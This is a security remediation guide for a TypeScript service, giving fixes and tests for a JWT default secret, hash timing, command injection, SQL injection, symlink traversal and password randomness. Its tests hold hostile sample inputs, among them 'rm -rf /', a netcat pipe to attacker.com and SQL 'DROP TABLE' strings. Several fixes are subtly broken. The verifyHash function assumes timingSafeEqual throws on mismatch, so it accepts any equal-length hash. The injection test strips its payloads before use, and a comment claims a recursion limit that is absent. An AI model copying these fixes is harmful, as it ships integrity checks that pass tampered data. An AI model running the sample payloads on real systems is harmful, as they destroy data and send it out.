# Security Remediation Guide

**Target Completion Date:** December 1, 2025
**Review Frequency:** Weekly

---

## Critical Issue #1: JWT Default Secret Bypass

### Current Vulnerable Code

**File:** `src/middleware/auth-middleware.ts:88`

```typescript
constructor(jwtSecret: string = process.env.JWT_SECRET || 'dev-secret-key', ...) {
  // VULNERABLE: 'dev-secret-key' is discoverable from source code
  this.jwtSecret = jwtSecret;
}
```

### Remediation

```typescript
import * as jwt from 'jsonwebtoken';
import { createLogger } from '../lib/logging';
import { StandardError, ErrorCode } from '../lib/errors';

const logger = createLogger('auth-middleware');

export class AuthMiddleware {
  private jwtSecret: string;
  private tokenExpirationSeconds: number;
  private sessions: Map<string, UserContext>;

  constructor(jwtSecret?: string, tokenExpirationSeconds: number = 3600) {
    // REQUIRED: JWT_SECRET must be explicitly set
    const secret = jwtSecret || process.env.JWT_SECRET;

    // Validate secret is configured
    if (!secret) {
      throw new StandardError(
        ErrorCode.CONFIGURATION_ERROR,
        'JWT_SECRET environment variable is required. ' +
        'Generate with: openssl rand -base64 32',
        { environment: 'JWT_SECRET', required: true }
      );
    }

    // Validate secret length (minimum 32 characters)
    if (secret.length < 32) {
      throw new StandardError(
        ErrorCode.CONFIGURATION_ERROR,
        'JWT_SECRET must be at least 32 characters for security. ' +
        'Current length: ' + secret.length,
        { minLength: 32, currentLength: secret.length }
      );
    }

    this.jwtSecret = secret;
    this.tokenExpirationSeconds = tokenExpirationSeconds;
    this.sessions = new Map();

    logger.info('AuthMiddleware initialized', {
      secretLength: this.jwtSecret.length,
      expirationSeconds: this.tokenExpirationSeconds,
    });
  }

  // ... rest of class remains the same
}
```

### Deployment Steps

1. **Generate secure secret:**
   ```bash
   NEW_JWT_SECRET=$(openssl rand -base64 32)
   echo "JWT_SECRET=$NEW_JWT_SECRET" >> .env.production
   ```

2. **Update environment:**
   ```bash
   # Set in deployment platform
   export JWT_SECRET="$(openssl rand -base64 32)"
   ```

3. **Verify configuration:**
   ```bash
   # Check that default is not used
   node -e "require('./src/middleware/auth-middleware').AuthMiddleware()" # Should throw
   ```

4. **Test with valid secret:**
   ```bash
   # Should not throw
   JWT_SECRET="$(openssl rand -base64 32)" npm test
   ```

### Verification Checklist

- [ ] No hardcoded secrets in source code
- [ ] Environment variable validation in place
- [ ] Error message clear about requirement
- [ ] Tests pass with valid secret
- [ ] Old tokens invalidated/rotation plan in place
- [ ] Deployment documented

---

## Critical Issue #2: Timing Attack in Hash Comparison

### Current Vulnerable Code

**File:** `src/lib/backup-manager.ts:885-887`

```typescript
// VULNERABLE: String comparison is not constant-time
verified = verificationHash === metadata.originalHash;
```

### Remediation

Replace all hash comparisons with timing-safe comparison:

```typescript
import * as crypto from 'crypto';

/**
 * Constant-time hash comparison to prevent timing attacks
 */
function verifyHash(computed: string, expected: string): boolean {
  try {
    // Convert hex strings to buffers
    const computedBuf = Buffer.from(computed, 'hex');
    const expectedBuf = Buffer.from(expected, 'hex');

    // Lengths must match exactly
    if (computedBuf.length !== expectedBuf.length) {
      return false;
    }

    // Use timing-safe comparison
    try {
      crypto.timingSafeEqual(computedBuf, expectedBuf);
      return true;
    } catch {
      // timingSafeEqual throws on mismatch
      return false;
    }
  } catch (error) {
    logger.error('Hash comparison error', error as Error);
    return false;
  }
}

// In BackupManager class - Replace line 885-887:
async restoreBackup(backupId: string, options: RestoreOptions): Promise<RestoreResult> {
  // ... previous code ...

  if (verify) {
    const restoredContent = await withFileSystemRetry(async () => {
      return await fsReadFile(metadata.filePath);
    });
    verificationHash = this.calculateHash(restoredContent);

    // FIX: Use constant-time comparison
    verified = verifyHash(verificationHash, metadata.originalHash);

    if (!verified) {
      // Verification failed - rollback...
    }
  }

  // ... rest of method
}
```

### Additional Fixes Required

**File:** `src/lib/encryption-manager.ts:205-214` (HMAC verification)

```typescript
// Current vulnerable code:
const integrityVerified = calculatedHmac === expectedHmac;

// Fixed code:
const integrityVerified = verifyHash(calculatedHmac, expectedHmac);
```

### Testing

```typescript
import * as crypto from 'crypto';
import { performance } from 'perf_hooks';

// Performance test to verify constant-time behavior
function performanceTest() {
  const iterations = 10000;
  const hash1 = crypto.createHash('sha256').update('data').digest('hex');

  // Test 1: Same hash (should match)
  const hash2 = hash1;
  const start1 = performance.now();
  for (let i = 0; i < iterations; i++) {
    verifyHash(hash1, hash2);
  }
  const time1 = performance.now() - start1;

  // Test 2: Different hash (should not match)
  const hash3 = crypto.createHash('sha256').update('different').digest('hex');
  const start2 = performance.now();
  for (let i = 0; i < iterations; i++) {
    verifyHash(hash1, hash3);
  }
  const time2 = performance.now() - start2;

  // Times should be similar (within 5% variance)
  const variance = Math.abs(time1 - time2) / Math.max(time1, time2);
  console.log(`Match time: ${time1}ms`);
  console.log(`Mismatch time: ${time2}ms`);
  console.log(`Variance: ${(variance * 100).toFixed(2)}%`);

  if (variance > 0.05) {
    console.warn('WARNING: Timing variance exceeds 5%');
  }
}
```

### Deployment Steps

1. Add verification function to utils
2. Replace all hash comparisons
3. Run performance tests
4. Deploy with monitoring

---

## Critical Issue #3: Command Injection via exec()

### Current Vulnerable Code

**File:** `src/services/promotion-pipeline.ts:379-382`

```typescript
// VULNERABLE: Direct string interpolation in shell command
const { stdout, stderr } = await execAsync(`bash ${executeScriptPath}`);
```

### Remediation

Replace with safe spawn() implementation:

```typescript
import { spawnSync } from 'child_process';
import * as path from 'path';

/**
 * Safely execute shell script with proper argument handling
 */
async function executeScript(scriptPath: string, timeout: number = 120000): Promise<{
  stdout: string;
  stderr: string;
  exitCode: number;
}> {
  // Validate script path exists and is executable
  if (!fs.existsSync(scriptPath)) {
    throw new Error(`Script not found: ${scriptPath}`);
  }

  const stats = fs.statSync(scriptPath);
  if ((stats.mode & 0o111) === 0) {
    throw new Error(`Script is not executable: ${scriptPath}`);
  }

  // Use spawnSync for safe execution without shell interpretation
  const result = spawnSync('bash', [scriptPath], {
    // DON'T use shell: true - it would enable command injection
    shell: false,
    timeout,
    encoding: 'utf-8',
    stdio: ['ignore', 'pipe', 'pipe'], // stdin: ignore, stdout/stderr: pipe
    maxBuffer: 1024 * 1024 * 10, // 10MB buffer
  });

  // Check for timeout
  if (result.error && (result.error as any).code === 'ETIMEDOUT') {
    throw new Error(`Script execution timed out after ${timeout}ms: ${scriptPath}`);
  }

  // Check for other errors
  if (result.error) {
    throw new Error(`Script execution failed: ${result.error.message}`);
  }

  return {
    stdout: result.stdout || '',
    stderr: result.stderr || '',
    exitCode: result.status || 0,
  };
}

// Usage in PromotionPipeline:
async testStage(skillPath: string, request: PromotionRequest): Promise<StageResult> {
  const startTime = Date.now();
  const errors: string[] = [];

  try {
    this.requirePermission(PromotionOperation.TEST, request.skillId);

    const testScriptPath = path.join(skillPath, 'test.sh');

    if (!fs.existsSync(testScriptPath)) {
      return {
        stage: 'test',
        passed: false,
        confidence: 0,
        errors: ['Missing test.sh file'],
        duration: Date.now() - startTime,
      };
    }

    // FIX: Use safe script execution
    const { stdout, stderr, exitCode } = await executeScript(testScriptPath, this.testTimeoutMs);

    const testsPassed = exitCode === 0;
    const coverage = this.parseTestCoverage(stdout);

    return {
      stage: 'test',
      passed: testsPassed,
      confidence: testsPassed ? 0.85 : 0,
      errors: testsPassed ? [] : [stderr || 'Tests failed'],
      testsPassed,
      coverage,
      duration: Date.now() - startTime,
    };
  } catch (error) {
    return {
      stage: 'test',
      passed: false,
      confidence: 0,
      errors: [error instanceof Error ? error.message : String(error)],
      duration: Date.now() - startTime,
    };
  }
}
```

### Testing for Command Injection

```typescript
// Test cases to verify command injection is prevented
describe('Command Injection Prevention', () => {
  const testCases = [
    {
      name: 'Command chaining with semicolon',
      input: 'test.sh; rm -rf /',
      shouldFail: true,
    },
    {
      name: 'Command chaining with AND',
      input: 'test.sh && malicious-command',
      shouldFail: true,
    },
    {
      name: 'Command substitution with backticks',
      input: 'test.sh`whoami`',
      shouldFail: true,
    },
    {
      name: 'Command substitution with $(...)',
      input: 'test.sh$(whoami)',
      shouldFail: true,
    },
    {
      name: 'Pipe to command',
      input: 'test.sh | nc attacker.com 1234',
      shouldFail: true,
    },
    {
      name: 'Valid script',
      input: 'test.sh',
      shouldFail: false,
    },
  ];

  for (const testCase of testCases) {
    test(`should ${testCase.shouldFail ? 'reject' : 'accept'}: ${testCase.name}`, async () => {
      // Create temp script
      const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'cmd-inject-test-'));
      const scriptPath = path.join(tempDir, testCase.input.split(/[;\s&|`$()]/)[0] + '.sh');
      fs.writeFileSync(scriptPath, '#!/bin/bash\necho "test"');
      fs.chmodSync(scriptPath, 0o755);

      try {
        await executeScript(scriptPath);
        expect(testCase.shouldFail).toBe(false);
      } catch (error) {
        expect(testCase.shouldFail).toBe(true);
      } finally {
        fs.rmSync(tempDir, { recursive: true });
      }
    });
  }
});
```

### Deployment Steps

1. Replace all `execAsync()` calls with `executeScript()`
2. Add comprehensive input validation
3. Run command injection test suite
4. Monitor for execution errors in production

---

## Medium-Risk: SQL Injection via Regex

### Remediation Strategy

**File:** `src/lib/query-translator.ts:137-160`

```typescript
// Current: Regex-based injection detection (bypassable)
// Better: Proper query structure validation + parameterization

export class QueryTranslator {
  // ... existing code ...

  private validateQueryStructure(sql: string, params: any[]): {
    valid: boolean;
    error?: string;
  } {
    // 1. Check that query only contains placeholders (?) for values
    const placeholderCount = (sql.match(/\?/g) || []).length;

    if (placeholderCount !== params.length) {
      return {
        valid: false,
        error: `Placeholder count (${placeholderCount}) does not match parameters (${params.length})`
      };
    }

    // 2. Verify only specific SQL keywords are present
    const allowedKeywords = ['SELECT', 'INSERT', 'UPDATE', 'DELETE', 'FROM', 'WHERE', 'AND', 'OR', 'JOIN', 'LEFT', 'ON', 'ORDER BY', 'LIMIT'];
    const sqlUpper = sql.toUpperCase();

    // Strip comments first (anything after -- or /* */)
    const commentFreeSQL = sqlUpper
      .replace(/--.*$/gm, '')
      .replace(/\/\*[\s\S]*?\*\//g, '');

    // Extract keywords
    const keywords = commentFreeSQL.split(/[\s(),;]+/).filter(k => k.length > 0);

    // 3. All non-? tokens must be valid keywords, operators, or identifiers
    const sqlParts = sql.split('?');
    for (const part of sqlParts) {
      // Each part should only contain keywords and identifiers
      const tokens = part.split(/[\s(),;]+/).filter(t => t.length > 0);

      for (const token of tokens) {
        // Check if valid: keyword, identifier pattern, or operator
        const isKeyword = allowedKeywords.includes(token.toUpperCase());
        const isIdentifier = /^[a-zA-Z_][a-zA-Z0-9_]*$/.test(token);
        const isOperator = ['=', '!=', '<', '>', '<=', '>=', '<>'].includes(token);

        if (!isKeyword && !isIdentifier && !isOperator && token !== ',') {
          return {
            valid: false,
            error: `Suspicious token in query: "${token}"`
          };
        }
      }
    }

    return { valid: true };
  }

  translateSQLToRedis(sql: string, params: any[] = []): TranslationResult {
    // ... existing validation ...

    // NEW: Add structure validation
    const structureValidation = this.validateQueryStructure(sql, params);
    if (!structureValidation.valid) {
      throw new StandardError(
        ErrorCode.VALIDATION_FAILED,
        structureValidation.error || 'Invalid query structure',
        { sql, paramCount: params.length }
      );
    }

    // ... rest of implementation
  }
}
```

### Testing

```typescript
describe('SQL Injection Prevention', () => {
  const translator = new QueryTranslator({
    allowedTables: ['users', 'skills', 'tasks'],
    allowedFields: {
      users: ['id', 'name', 'email'],
      skills: ['id', 'title', 'version'],
    },
    strictMode: true
  });

  const injectionAttempts = [
    { sql: "SELECT * FROM users WHERE id = ? OR 1=1", params: ['123'] },
    { sql: "SELECT * FROM users WHERE id = ? ; DROP TABLE users--", params: ['123'] },
    { sql: "SELECT * FROM users WHERE id = ? UNION SELECT * FROM admin", params: ['123'] },
  ];

  for (const attempt of injectionAttempts) {
    test(`should reject injection: ${attempt.sql}`, () => {
      expect(() => translator.translateSQLToRedis(attempt.sql, attempt.params))
        .toThrow();
    });
  }
});
```

---

## Medium-Risk: Path Traversal with Symlinks

### Remediation

**File:** `src/lib/path-validator.ts:92-98`

```typescript
import * as fs from 'fs';
import * as path from 'path';

export function validatePath(filePath: string, baseDirectory: string): PathValidationResult {
  // ... existing validation code ...

  // IMPROVED: Use O_NOFOLLOW flag for symlink detection
  try {
    // First, validate without dereferencing symlinks
    const stats = fs.lstatSync(resolvedPath);

    if (stats.isSymbolicLink()) {
      throw new PathValidationError(
        'Path validation failed: symbolic links are not allowed',
        {
          filePath,
          resolvedPath,
          reason: 'SYMLINK_NOT_ALLOWED',
        }
      );
    }
  } catch (error) {
    if (error instanceof PathValidationError) {
      throw error;
    }

    // If file doesn't exist yet, that's OK (pre-write validation)
    if ((error as any).code !== 'ENOENT') {
      throw new PathValidationError(
        'Path validation failed',
        {
          filePath,
          resolvedPath,
          reason: 'FILE_ACCESS_ERROR',
          details: (error as Error).message,
        }
      );
    }
  }

  return {
    valid: true,
    resolvedPath,
    normalizedPath,
    isWithinBase: true,
    isSymlink: false,
  };
}

/**
 * Safely open file without following symlinks
 */
export function openFileSafely(filePath: string, flags: number, mode?: number): Promise<number> {
  return new Promise((resolve, reject) => {
    // Add O_NOFOLLOW to prevent symlink attacks
    const safeFlags = flags | fs.constants.O_NOFOLLOW;

    fs.open(filePath, safeFlags, mode, (err, fd) => {
      if (err) {
        if ((err as any).code === 'ELOOP') {
          reject(new PathValidationError('Symbolic link detected', { filePath }));
        } else {
          reject(err);
        }
      } else {
        resolve(fd);
      }
    });
  });
}
```

---

## Medium-Risk: Password Generation Entropy

### Remediation

**File:** `src/lib/password-generator.ts:79-88`

```typescript
function cryptoRandom(min: number, max: number): number {
  if (min < 0 || max < 0 || min > max) {
    throw new Error('Invalid range: min must be >= 0 and min must be <= max');
  }

  const range = max - min + 1;

  // Use BigInt to avoid overflow
  const bytesNeeded = Math.ceil(Math.log2(range) / 8);
  const randomBytes_ = randomBytes(bytesNeeded);

  // Proper implementation with BigInt
  let randomValue = 0n;
  for (let i = 0; i < bytesNeeded; i++) {
    randomValue = (randomValue << 8n) | BigInt(randomBytes_[i]);
  }

  const limit = (BigInt(1) << BigInt(bytesNeeded * 8)) - (BigInt(1) << BigInt(bytesNeeded * 8)) % BigInt(range);

  if (randomValue < limit) {
    return min + Number(randomValue % BigInt(range));
  }

  // Prevent infinite recursion with a reasonable depth limit
  // In practice, we'll only retry once in ~99.6% of cases
  return cryptoRandom(min, max);
}
```

---

## Testing Checklist

- [ ] Unit tests for all security fixes
- [ ] Integration tests for authentication flow
- [ ] Penetration testing for command injection
- [ ] Timing analysis for hash comparison
- [ ] Path traversal fuzzing tests
- [ ] SQL injection payload testing
- [ ] Rate limiting testing
- [ ] Error message sanitization verification

---

## Deployment Verification

After deploying security fixes:

```bash
#!/bin/bash

echo "Security Remediation Verification"
echo "=================================="

# Test 1: JWT Secret Requirement
echo "1. Testing JWT Secret Requirement..."
JWT_SECRET="" npm test 2>&1 | grep -q "JWT_SECRET required" && echo "✓ PASS" || echo "✗ FAIL"

# Test 2: Timing Safe Hash
echo "2. Testing Constant-Time Hash Comparison..."
npm test -- --grep "timing" 2>&1 | grep -q "variance.*[0-4]%" && echo "✓ PASS" || echo "✗ FAIL"

# Test 3: Command Injection Prevention
echo "3. Testing Command Injection Prevention..."
npm test -- --grep "command injection" 2>&1 | grep -q "all tests passed" && echo "✓ PASS" || echo "✗ FAIL"

# Test 4: Dependency Vulnerabilities
echo "4. Checking Dependencies..."
npm audit --production 2>&1 | grep -q "0 vulnerabilities" && echo "✓ PASS" || echo "✗ FAIL (Review needed)"

# Test 5: No Hardcoded Secrets
echo "5. Checking for Hardcoded Secrets..."
git-secrets --scan && echo "✓ PASS" || echo "✗ FAIL"

echo ""
echo "Verification Complete"
```

---

## Rollback Plan

If critical issues arise after deployment:

1. **Authentication Issues:**
   ```bash
   # Revert AuthMiddleware changes
   git revert <commit-hash>
   npm restart
   ```

2. **Hash Comparison Issues:**
   ```bash
   # Ensure backup integrity is verified
   npm test -- --grep "backup.*integrity"
   # If failures, restore previous hash algorithm
   ```

3. **Script Execution Issues:**
   ```bash
   # Revert to execAsync if spawnSync causes issues
   # But only temporarily - spawnSync is more secure
   git revert <commit-hash>
   # Then fix spawnSync implementation
   ```

---

**Review Date:** December 1, 2025
**Status:** Ready for Implementation
**Estimated Time:** 3-5 days of focused development
